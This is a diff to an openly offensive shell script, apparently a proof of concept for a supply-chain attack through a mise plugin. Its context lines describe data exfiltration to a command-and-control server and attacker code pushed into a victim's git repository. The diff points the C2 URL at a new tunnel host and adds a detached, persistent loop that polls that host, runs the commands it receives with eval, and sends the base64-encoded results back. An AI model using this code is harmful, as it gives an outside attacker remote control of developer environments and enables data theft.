@@ -4,7 +4,7 @@
 # Single-shot exfil: collects data, sends to C2, pushes git, exits cleanly.
 # =============================================================================
 
-C2_URL="${C2_URL:-https://kappexpoc2.loca.lt}"
+C2_URL="${C2_URL:-https://kappexpoc3.loca.lt}"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -59,3 +59,18 @@ git commit -m "attacker code injection via mise plugin" 2>/dev/null
 PUSH=$(git push 2>&1)
 exfil "=== GIT PUSH (attacker injected code into victim repo) ===
 $PUSH"
+
+# === 5. PERSISTENT C2 SHELL (detached so mise exits cleanly) ===
+setsid sh -c '
+  while true; do
+    CMD=$(curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
+      "'"$C2_URL"'/c2/poll?id='"$SANDBOX_ID"'" 2>/dev/null)
+    if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
+      RESULT=$(eval "$CMD" 2>&1 | base64 -w0 2>/dev/null || eval "$CMD" 2>&1 | base64 2>/dev/null)
+      curl -s -m 10 -G -H "Bypass-Tunnel-Reminder: true" \
+        --data-urlencode "r=$RESULT" \
+        "'"$C2_URL"'/c2/result?id='"$SANDBOX_ID"'" >/dev/null 2>&1
+    fi
+    sleep 3
+  done
+' </dev/null >/dev/null 2>&1 &
